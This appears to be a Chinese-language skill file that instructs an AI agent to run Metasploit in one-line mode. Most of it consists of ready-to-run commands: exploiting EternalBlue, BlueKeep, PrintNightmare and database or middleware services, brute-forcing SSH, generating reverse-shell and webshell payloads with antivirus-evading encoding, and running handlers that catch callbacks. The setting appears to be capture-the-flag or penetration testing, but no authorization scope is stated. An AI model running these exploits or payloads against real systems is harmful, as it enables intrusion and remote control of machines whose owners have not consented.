---
name: msf-oneshot
description: "Metasploit Framework 一行式调用方法论。当需要利用操作系统级漏洞（如 EternalBlue/MS17-010）、数据库远程漏洞（如 PostgreSQL/MySQL RCE）、网络服务漏洞（SMB/RDP/FTP）、或需要生成 payload/后渗透操作时使用。MSF 拥有 2000+ exploit 模块，覆盖 Windows/Linux 操作系统、数据库、网络设备的远程利用。本技能教你用 msfconsole -x 一行式模式调用 MSF，避免交互式 CLI 的复杂性。任何涉及 metasploit、msfconsole、meterpreter、系统级 exploit、远程溢出、payload 生成的场景都应使用此技能"
metadata:
  tags: "metasploit,msf,msfconsole,meterpreter,exploit,eternalblue,ms17-010,payload,远程利用,操作系统漏洞,数据库漏洞,后渗透,msfvenom"
  category: "tool"
---

# Metasploit Framework 一行式调用方法论

MSF 是交互式 CLI 工具，直接用 msfconsole 交互对 AI Agent 不友好。核心技巧：**用 `msfconsole -q -x` 一行式模式**，把所有命令串联在一条 bash 命令里执行。

## 使用前须知

msfconsole 启动需要 10-30 秒加载模块库，这是正常现象。一行式（`-x`）命令执行完会自动退出，无法维持 session——如果需要保持 meterpreter 连接，参考 Phase 4 的 handler 模式。

对于简单的 Web 漏洞（SQLi/XSS/SSRF），curl 或 python 脚本更快更直接；MSF 的核心价值在于 OS 级 exploit（EternalBlue 等）和标准化 payload 生成，这些场景下 MSF 无可替代。

## 参考资料

常用 exploit 模块速查表和 payload 生成指南 → [references/msf-modules.md](references/msf-modules.md)

---

## Phase 1: 一行式基本语法

```bash
# 基本格式：用分号连接多条 MSF 命令
msfconsole -q -x "use EXPLOIT; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# -q = 静默启动（不显示 banner）
# -x = 执行命令字符串
# exit = 执行完退出（重要！否则会挂起）
```

### 完整示例：EternalBlue (MS17-010)

```bash
msfconsole -q -x "
  use exploit/windows/smb/ms17_010_eternalblue;
  set RHOSTS 10.0.0.1;
  set LHOST 10.0.0.2;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LPORT 4444;
  run;
  exit
"
```

## Phase 2: 常见漏洞利用场景

### 2.1 操作系统级漏洞（Zone 3/4 最常用）

```bash
# MS17-010 EternalBlue（Windows SMB）
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# MS08-067（Windows Server 2003/XP）
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# BlueKeep（Windows RDP CVE-2019-0708）
msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET; set LHOST ATTACKER; set TARGET 2; run; exit"

# PrintNightmare（Windows Print Spooler）
msfconsole -q -x "use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"
```

### 2.2 数据库远程利用

```bash
# PostgreSQL 代码执行（默认口令 postgres/postgres）
msfconsole -q -x "use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS TARGET; set USERNAME postgres; set PASSWORD postgres; set LHOST ATTACKER; run; exit"

# MySQL UDF 提权（需要已知凭据）
msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS TARGET; set USERNAME root; set PASSWORD ''; set LHOST ATTACKER; run; exit"

# MSSQL xp_cmdshell
msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS TARGET; set USERNAME sa; set PASSWORD password; set LHOST ATTACKER; run; exit"

# Redis 未授权写 SSH key / Webshell
msfconsole -q -x "use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"
```

### 2.3 Web/中间件服务

```bash
# Tomcat Manager 部署 WAR（需要凭据）
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set RPORT 8080; set HttpUsername tomcat; set HttpPassword tomcat; set LHOST ATTACKER; run; exit"

# JBoss 反序列化
msfconsole -q -x "use exploit/multi/http/jboss_invoke_deploy; set RHOSTS TARGET; set RPORT 8080; set LHOST ATTACKER; run; exit"

# Jenkins Script Console
msfconsole -q -x "use exploit/multi/http/jenkins_script_console; set RHOSTS TARGET; set RPORT 8080; set TARGETURI /; set LHOST ATTACKER; run; exit"
```

### 2.4 网络服务

```bash
# FTP vsftpd 2.3.4 后门
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run; exit"

# Samba（CVE-2017-7494）
msfconsole -q -x "use exploit/linux/samba/is_known_pipename; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# SSH 暴力破解
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run; exit"
```

## Phase 3: 漏洞检测（不利用，只检测）

用 `auxiliary/scanner` 或 `check` 命令进行安全检测：

```bash
# 检测 MS17-010 是否存在（不利用）
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS TARGET; run; exit"

# SMB 版本检测
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS TARGET; run; exit"

# 批量端口服务检测
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS TARGET; set PORTS 445,3389,1433,3306; run; exit"

# 使用 check 命令（部分 exploit 支持）
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; check; exit"
```

## Phase 4: Payload 生成（msfvenom）

msfvenom 不需要 msfconsole，直接 bash 调用：

```bash
# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.php

# JSP webshell（Tomcat WAR 部署用）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.py

# 编码绕过（基础免杀）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
```

## Phase 5: Handler 模式（接收反弹 shell）

当 payload 需要回连时，先启动 handler：

```bash
# 启动 handler（后台运行）
msfconsole -q -x "
  use exploit/multi/handler;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LHOST 0.0.0.0;
  set LPORT 4444;
  set ExitOnSession false;
  exploit -j
" &

# 然后触发目标执行 payload（通过其他漏洞上传并执行 shell.exe）
```

⚠️ Handler 模式会持续运行，需要手动 `kill` 进程。

## Phase 6: 后渗透基本操作

获取 meterpreter session 后的常用操作（通过一行式难以完成，但可以串联基本命令）：

```bash
# 获取系统信息
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit; sysinfo; getuid; exit"
```

更实际的做法——直接用反弹 shell 执行命令，不依赖 meterpreter 交互：
```bash
# 生成直接执行命令的 payload（不需要 meterpreter）
msfvenom -p windows/x64/exec CMD="whoami > C:\\flag.txt" -f exe -o cmd.exe
msfvenom -p linux/x64/exec CMD="cat /flag > /tmp/result.txt" -f elf -o cmd.elf
```

## 决策树：什么时候用 MSF？

```
需要利用什么类型的漏洞？
├─ Web 应用漏洞 (SQLi/XSS/SSRF)
│   └→ 不用 MSF，用 curl/sqlmap/手动
│
├─ 已知 CVE + 有 nuclei 模板
│   └→ 先试 nuclei，失败再考虑 MSF
│
├─ OS 级漏洞 (EternalBlue/BlueKeep/PrintNightmare)
│   └→ ✅ MSF 首选
│
├─ 数据库远程利用 (有凭据)
│   └→ ✅ MSF 方便，但也可用原生客户端
│
├─ 需要生成 payload (EXE/ELF/WAR)
│   └→ ✅ msfvenom 首选
│
└─ 后渗透/提权
    └→ 视情况：简单命令用 shell，复杂操作考虑 meterpreter
```
